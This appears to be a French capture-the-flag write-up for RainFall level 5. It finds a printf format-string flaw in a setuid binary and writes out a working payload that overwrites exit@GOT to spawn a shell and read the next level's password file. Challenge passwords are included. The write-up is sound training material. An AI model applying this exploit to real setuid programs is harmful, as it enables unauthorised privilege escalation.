## Connexion et exploration

```bash
ssh level5@192.168.1.150 -p 4243
```
> Le mot de passe est : `0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`

Une fois connecté, cet écran s'affiche : 
```bash
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level5/level5
```

informations sur le binaire a exploiter :
```bash
level5@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level6 users 5385 Mar  6  2016 level5
level5@RainFall:~$ file level5
level5: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xed1835fb7b09db7da4238a6fa717ad9fd835ae92, not stripped
```

L'execution :
```bash
level5@RainFall:~$ ./level5

```

Entree d'un input :
```bash
level5@RainFall:~$ ./level5
salut
salut
```
> Il renvoi l'input

Est ce que c'est un printf ? 
```bash
level5@RainFall:~$ ./level5
%p
0x200
```
> hm interessant, c'est bien un printf ET il me crache une adresse memoire. Pas de format specifier, donc potentiellement une attaque de format string possible.

Reconstruisons le binaire, et allons faire un petit objdump pour voir ce qu'il en est :

[Le resultat de objdump](./source/objdump.txt)  
[Code source reconstruit](./source/level5.c) via [Boomerang](https://dogbolt.org/) (juste pour un apercu rapide)

On voit bien qu'un `printf` est appelé sans format specifier, ce qui nous permet [une attaque de format string](https://owasp.org/www-community/attacks/Format_string_attack).  
On voit aussi que dans la fonction `<o>` a un call system vers `/bin/sh` (ligne 142 de l'objdump).  

Notre but est donc clair : **écrire l’adresse de la fonction o() dans l’entrée GOT de exit, grâce à l’attaque de format string, pour que l’appel à `exit()` exécute en réalité `/bin/sh`**
> GOT : Global Offset Table, une table utilisée pour la liaison dynamique des fonctions dans les programmes ELF.

Trouvons l’adresse des entrées importantes de la GOT :
```bash 
level5@RainFall:~$ objdump -R level5 # Affiche les relocation records

level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit
0804983c R_386_JUMP_SLOT   __libc_start_main
```

Les adresses qui nous intéressent :
- system@GOT : `0x08049830`
- _exit@GOT  : `0x08049828`
- exit@GOT   : `0x08049838`  ← cible de notre attaque

Notre objectif est clair : remplacer l’adresse contenue dans `exit@GOT` par celle de la fonction `o()`  
Ainsi, lorsque le programme appellera `exit(1)`, il exécutera en réalité `/bin/sh`  

<br>

## Construction du payload

- On commence par placer l’adresse de `exit@GOT` au début de notre entrée, en format little endian (ordre des octets inversé) :  
    • Par exemple, `0x08049838` devient : `\x38\x98\x04\x08`  
- Quand la fonction `printf` s’exécute, elle affiche d’abord ces 4 octets. Ils comptent dans le nombre total de caractères affichés  
- Notre objectif est que, au moment où `%n` est utilisé, le compteur de caractères affichés par `printf` soit exactement égal à l’adresse de la fonction `o` (`0x080484a4`, soit 134513828 en décimal)  
- Pour cela, on ajoute `%134513824d` dans la chaîne de format. Comme les 4 premiers octets ont déjà été affichés, on complète avec 134513824 caractères pour atteindre le total voulu  
- Ensuite, on utilise `%4$n` :
    • `%4$` indique à `printf` d’utiliser le 4ᵉ argument comme adresse où écrire la valeur du compteur  
    • Ici, le 4ᵉ argument correspond à l’adresse que nous avons placée au début (`0x08049838`)  
    • `%n` va donc écrire la valeur du compteur (134513828) à cette adresse, ce qui permet de modifier le comportement du programme  

<br>

## Lancement de l'attaque :

```bash
(python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"'; cat) | ./level5
```
> on a maintenant notre shell

Go recupérer le `.pass` :
```bash
cd /home/user/level6
cat .pass
```

Mot de passe du niveau 6 : `d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31`

<br>

## Pour reproduire l'attaque

1. Connexion en ssh au niveau 5
```bash
ssh level5@192.168.1.150 -p 4243
```

2. Execution de l'attque :
```bash
(python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"'; cat) | ./level5
```

3. Récupération du mot de passe du niveau 6
```bash
cd /home/user/level6
cat .pass
```
